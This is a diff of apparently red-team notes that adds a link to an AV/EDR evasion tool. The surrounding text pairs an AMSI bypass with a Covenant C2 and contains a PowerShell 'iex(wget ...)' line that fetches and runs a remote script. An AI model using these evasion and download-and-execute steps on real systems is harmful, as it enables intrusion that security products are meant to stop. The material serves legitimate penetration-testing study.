@@ -34,7 +34,7 @@ iex(wget https://gist.github.com/pich4ya/e93abe76d97bd1cf67bfba8dce9c0093/raw/e3
 
 # Using condor tool + AMSI bypass + Covenant C2
 
-The condor tool is used for evasion of protection like AVs/EDRs/XDRs. You can use it to combo an AMSI bypass and a C2 like Covenant.
+The [condor](https://github.com/MrEmpy/Condor) tool is used for evasion of protection like AVs/EDRs/XDRs. You can use it to combo an AMSI bypass and a C2 like Covenant.
 
 1. On the attacker's machine, create a folder where there will be two powershell scripts, one to bypass AMSI and another for the target to connect with C2.
 
